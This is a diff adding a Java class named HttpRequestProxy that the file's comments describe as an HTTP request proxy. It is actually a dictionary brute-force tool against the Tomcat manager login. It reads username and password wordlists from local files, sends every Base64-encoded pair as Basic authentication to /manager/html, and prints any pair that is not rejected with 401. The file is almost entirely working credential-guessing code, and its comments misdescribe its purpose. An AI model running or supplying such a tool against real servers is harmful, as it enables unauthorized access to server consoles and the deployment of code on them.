@@ -1,0 +1,139 @@
+package test;
+
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+
+import org.apache.log4j.Logger;
+
+import com.alibaba.druid.util.Base64;
+
+/**
+ * <pre>
+ * HTTP请求代理类
+ * </pre>
+ * 
+ * @author benl
+ * @version 1.0, 2007-7-3
+ */
+public class HttpRequestProxy {
+	/**
+	 * 连接超时
+	 */
+	private static int connectTimeOut = 5000;
+
+	/**
+	 * 读取数据超时
+	 */
+	private static int readTimeOut = 10000;
+
+	/**
+	 * 请求编码
+	 */
+	private static String requestEncoding = "gbk";
+
+	/**
+	 * <pre>
+	 * 发送带参数的GET的HTTP请求
+	 * </pre>
+	 * 
+	 * @param reqUrl
+	 *            HTTP请求URL
+	 * @param parameters
+	 *            参数映射表
+	 * @return HTTP响应的字符串
+	 */
+
+	public static boolean doGet(String requrl, String getstr) {
+
+		boolean flag = false;
+		HttpURLConnection url_con = null;
+		String responseContent = null;
+		try {
+			StringBuffer params = new StringBuffer();
+			URL url = new URL(requrl);
+			url_con = (HttpURLConnection) url.openConnection();
+			// url_con.set
+			url_con.setRequestMethod("GET");
+			url_con.setRequestProperty("Connection", "Keep-Alive");
+			url_con.setRequestProperty("Cache-Control", "no-cache");
+			url_con.setRequestProperty("Authorization", "Basic " + getstr);
+			//System.setProperty("sun.net.client.defaultConnectTimeout", String.valueOf(HttpRequestProxy.connectTimeOut));// （单位：毫秒）jdk1.4换成这个,连接超时
+			//System.setProperty("sun.net.client.defaultReadTimeout", String.valueOf(HttpRequestProxy.readTimeOut)); // （单位：毫秒）jdk1.4换成这个,读操作超时
+			 url_con.setConnectTimeout(5000);//（单位：毫秒）jdk
+			// 1.5换成这个,连接超时
+			 url_con.setReadTimeout(5000);//（单位：毫秒）jdk 1.5换成这个,读操作超时
+			url_con.setDoOutput(true);
+
+			byte[] b = params.toString().getBytes();
+			url_con.getOutputStream().write(b, 0, b.length);
+			url_con.getOutputStream().flush();
+			url_con.getOutputStream().close();
+			System.out.println(url_con.getResponseCode());
+			if (url_con.getResponseCode() != 401) {
+				flag = true;
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		} finally {
+			if (url_con != null) {
+				url_con.disconnect();
+			}
+		}
+		return flag;
+
+	}
+
+	public static void readFile(String user, String pass) {
+		File fileuser = new File(user);
+		File filepass = new File(pass);
+		String struser = "";
+		String strpass = "";
+		try {
+			InputStream inuser = new FileInputStream(fileuser);
+			InputStreamReader isruser = new InputStreamReader(inuser);
+			BufferedReader bfuser = new BufferedReader(isruser);
+			String a = "";
+			while ((struser = bfuser.readLine()) != null) {
+				System.out.println("用户名"+struser);
+				InputStream inpass = new FileInputStream(filepass);
+				InputStreamReader isrpass = new InputStreamReader(inpass);
+				BufferedReader bfpass = new BufferedReader(isrpass);
+				while ((strpass = bfpass.readLine()) != null) {
+					System.out.println("密码"+strpass);
+					byte[] result ;
+					a= Base64.byteArrayToBase64((struser + ":" + strpass).getBytes());
+					//a = new String(result);
+					System.out.println("all： "+a);
+					boolean temp1;
+					temp1 = HttpRequestProxy.doGet("http://localhost:8080/manager/html/", a);
+					if (temp1) {
+						System.out.print((struser + ":" + strpass));
+						break;
+					}
+				}
+			}
+		} catch (FileNotFoundException e) {
+
+			e.printStackTrace();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+
+	public static void main(String[] args) {
+
+		String pathuser = "C:\\Amine\\user.txt";
+		String pathpass = "C:\\Amine\\password.txt";
+		HttpRequestProxy.readFile(pathuser, pathpass);
+	}
+}
